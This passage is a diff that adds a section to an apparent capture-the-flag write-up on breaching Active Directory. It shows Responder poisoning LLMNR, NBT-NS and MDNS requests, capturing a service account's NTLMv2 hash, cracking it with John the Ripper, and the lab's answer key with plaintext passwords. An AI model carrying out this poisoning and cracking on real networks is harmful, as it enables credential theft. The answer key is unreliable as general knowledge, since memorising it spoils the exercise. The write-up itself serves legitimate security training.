@@ -248,3 +248,125 @@ listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
 > 
 > 3. What is the password associated with the svcLDAP account? - `tryhackmeldappass1@`
 
+## Task 5 : Authentication Relays
+
+### SMB -
+
+- The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share).
+- In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration.
+
+### LLMNR, NBT-NS, and WPAD -
+
+- Responder allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to.
+- On a real LAN, Responder will attempt to poison any  **Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests** that are detected.
+
+On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. 
+
+Rather than overburdening network resources such as the DNS servers, **hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests** and seeing if any hosts respond. The **NBT-NS is the precursor protocol to LLMNR**, and **WPAD requests are made to try and find a proxy for future HTTP(s) connections**. 
+
+#### Using Responder to capture the NTLM hashes of a user -
+
+The lab has simulated an authentication request that can be poisoned that runs every 30 minutes.
+
+```bash
+┌──(kali㉿kali)-[~/THM/BreachingAD]
+└─$ sudo responder -I breachad
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [breachad]
+    Responder IP               [10.50.23.21]
+    Responder IPv6             [fe80::c75:29f8:7d1c:e9b3]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-ENUDPLZ5ZOF]
+    Responder Domain Name      [V62P.LOCAL]
+    Responder DCE-RPC Port     [45111]
+
+[+] Listening for events...                                                                                                                                                           
+
+[!] Error starting TCP server on port 389, check permissions or other servers running.
+
+[SMB] NTLMv2-SSP Client   : 10.200.25.202
+[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
+[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:2aaf1050b68ac4d4:6EA2273E4B4E05CB104FC4BF9D60A143:0101000000000000801D8C26CAEFDA01ADF6473B234E33B40000000002000800560036003200500001001E00570049004E002D0045004E005500440050004C005A0035005A004F00460004003400570049004E002D0045004E005500440050004C005A0035005A004F0046002E0056003600320050002E004C004F00430041004C000300140056003600320050002E004C004F00430041004C000500140056003600320050002E004C004F00430041004C0007000800801D8C26CAEFDA010600040002000000080030003000000000000000000000000020000042B508FF53558307FC8DAE8F25BF7A8F61A198D3C0DFC1EDE100AD36175D8FA10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320033002E00320031000000000000000000      
+```
+
+We got the username & the corresponding NTLM hash of the user. We can now use **Hashcat/JohnTheRipper** to crack it with the provided `passwordlist-1647876320267.txt` file.
+
+```bash
+┌──(kali㉿kali)-[~/THM/BreachingAD]
+└─$ ┌──(kali㉿kali)-[~/THM/BreachingAD]
+└─$ john --wordlist=passwordlist-1647876320267.txt hash.txt 
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+FPassword1!      (svcFileCopy)     
+1g 0:00:00:00 DONE (2024-08-16 11:03) 100.0g/s 51300p/s 51300c/s 51300C/s 123456..hockey
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+```
+> 1. What is the name of the tool we can use to poison and capture authentication requests on the network? - `responder`
+>  
+> 2. What is the username associated with the challenge that was captured? - `svcFileCopy`
+> 
+> 3. What is the value of the cracked password associated with the challenge that was captured? - `FPassword1!`
+
